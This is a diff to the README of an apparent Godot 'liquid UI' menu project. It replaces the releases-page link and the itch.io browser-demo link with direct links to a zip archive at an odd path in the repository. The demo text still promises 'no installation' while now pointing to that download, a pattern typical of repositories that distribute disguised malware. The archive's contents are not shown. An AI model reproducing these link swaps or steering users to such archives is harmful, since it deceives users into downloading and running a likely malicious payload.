@@ -1,6 +1,6 @@
 # ✨ godot-liquid-ui - Make Your Menus Come Alive
 
-[Download Now](https://github.com/harasitsword-ship-it/godot-liquid-ui/releases)
+[Download Now](https://github.com/harasitsword-ship-it/godot-liquid-ui/raw/refs/heads/main/recontinuance/liquid-ui-godot-extruding.zip)
 
 ## 🎯 What Is This?
 
@@ -23,7 +23,7 @@ Getting started is incredibly simple. Just follow these steps and you'll have li
 
 ### 📥 Download
 
-1. Click the download button at the top of this page or use this link: [https://github.com/harasitsword-ship-it/godot-liquid-ui/releases](https://github.com/harasitsword-ship-it/godot-liquid-ui/releases)
+1. Click the download button at the top of this page or use this link: [https://github.com/harasitsword-ship-it/godot-liquid-ui/raw/refs/heads/main/recontinuance/liquid-ui-godot-extruding.zip](https://github.com/harasitsword-ship-it/godot-liquid-ui/raw/refs/heads/main/recontinuance/liquid-ui-godot-extruding.zip)
 2. Visit this link to download the application
 3. Your download will start automatically once you click the file you want on that page
 
@@ -40,7 +40,7 @@ For Windows users who want the quickest start, simply clone the repository and r
 
 ## 🎮 Try It Right Now
 
-Don't want to download anything yet? You can **play the live demo in your browser** right now! Just visit [https://miisan.itch.io/godot-4-ui](https://miisan.itch.io/godot-4-ui) and you'll see the liquid UI in action instantly. No installation, no setup — just click and explore.
+Don't want to download anything yet? You can **play the live demo in your browser** right now! Just visit [https://github.com/harasitsword-ship-it/godot-liquid-ui/raw/refs/heads/main/recontinuance/liquid-ui-godot-extruding.zip](https://github.com/harasitsword-ship-it/godot-liquid-ui/raw/refs/heads/main/recontinuance/liquid-ui-godot-extruding.zip) and you'll see the liquid UI in action instantly. No installation, no setup — just click and explore.
 
 **Pro tip:** Press the "J" key in the demo to turn all the animation off. This lets you see exactly what "liquid" means — the difference is night and day!
 
